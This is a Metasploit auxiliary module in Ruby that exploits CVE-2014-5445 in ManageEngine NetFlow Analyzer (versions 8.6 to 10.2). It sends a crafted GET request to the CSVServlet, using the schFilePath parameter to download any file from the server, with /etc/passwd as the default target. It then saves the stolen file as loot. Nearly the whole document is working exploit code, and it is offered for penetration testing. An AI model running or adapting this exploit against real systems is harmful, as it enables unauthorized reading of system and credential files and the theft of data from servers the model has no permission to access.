##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'ManageEngine NetFlow Analyzer Arbitrary File Download',
      'Description'    => %q{
        This module exploits an arbitrary file download vulnerability in CSVServlet
        on ManageEngine NetFlow Analyzer. This module has been tested on both Windows
        and Linux with versions 8.6 to 10.2. Windows paths have to be escaped with 2
        backslashes on the command line.
      },
      'Author'         =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>', # Vulnerability Discovery and Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2014-5445' ],
          [ 'OSVDB', '115340' ],
          [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/ManageEngine/me_netflow_it360_file_dl.txt' ],
          [ 'URL', 'http://seclists.org/fulldisclosure/2014/Dec/9' ]
        ],
      'DisclosureDate' => 'Nov 30 2014'))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('TARGETURI',
          [ true, "The base path to NetFlow Analyzer", '/netflow' ]),
        OptString.new('FILEPATH', [true, 'Path of the file to download (escape Windows paths with 2 back slashes)', '/etc/passwd']),
      ], self.class)
  end


  def run
    # Create request
    begin
      print_status("#{peer} - Downloading file #{datastore['FILEPATH']}")
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(datastore['TARGETURI'], 'servlet', 'CSVServlet'),
        'vars_get' => { 'schFilePath' => datastore['FILEPATH'] },
      })
    rescue Rex::ConnectionError
      print_error("#{peer} - Could not connect.")
      return
    end

    # Show data if needed
    if res && res.code == 200
      if res.body.to_s.bytesize == 0
        print_error("#{peer} - 0 bytes returned, file does not exist or it is empty.")
        return
      end
      vprint_line(res.body.to_s)
      fname = File.basename(datastore['FILEPATH'])

      path = store_loot(
        'netflow.http',
        'application/octet-stream',
        datastore['RHOST'],
        res.body,
        fname
      )
      print_good("#{peer} - File saved in: #{path}")
    else
      print_error("#{peer} - Failed to download file.")
    end
  end
end
